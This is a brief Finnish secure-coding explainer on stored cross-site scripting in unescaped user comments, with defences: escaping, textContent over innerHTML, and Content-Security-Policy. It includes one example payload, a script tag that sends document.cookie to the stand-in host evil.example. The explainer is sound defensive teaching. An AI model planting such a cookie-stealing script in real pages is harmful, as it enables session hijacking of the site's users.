# Käyttäjän kommentti renderöidään HTML:ään ilman escapetusta. Mikä riski?

## Tilanne

Kommenttikenttään kirjoitetaan:

```html
<script>fetch('https://evil.example/steal?c='+document.cookie)</script>
```

Sovellus tallentaa tekstin ja renderöi sen suoraan sivulle `innerHTML`:llä tai templatessa ilman escapetusta. Selain suorittaa skriptin **uhrin sessiossa** — hyökkääjä voi varastaa cookiet, tehdä toimintoja käyttäjän nimissä tai muuttaa sivun sisältöä.

Tämä on **XSS (Cross-Site Scripting)** — yksi yleisimmistä web-haavoittuvuuksista.

## Ratkaisu

Kerroksittainen suoja:

1. **Escapaus** kontekstin mukaan — HTML-body, attribuutti, JavaScript, URL erikseen.
2. **`textContent`** DOM:ssa kun mahdollista — ei HTML-tulkintaa.
3. **Content-Security-Policy (CSP)** — rajoittaa inline-skriptejä ja ulkoisia lähteitä.

```javascript
// turvallinen
element.textContent = userComment;

// vaarallinen
element.innerHTML = userComment;
```

Frameworkit (React, Vue) escapaa oletuksena tekstin — vaara on `dangerouslySetInnerHTML` ja raaka HTML-templating.

[Lue lisää](https://owasp.org/www-community/attacks/xss/)
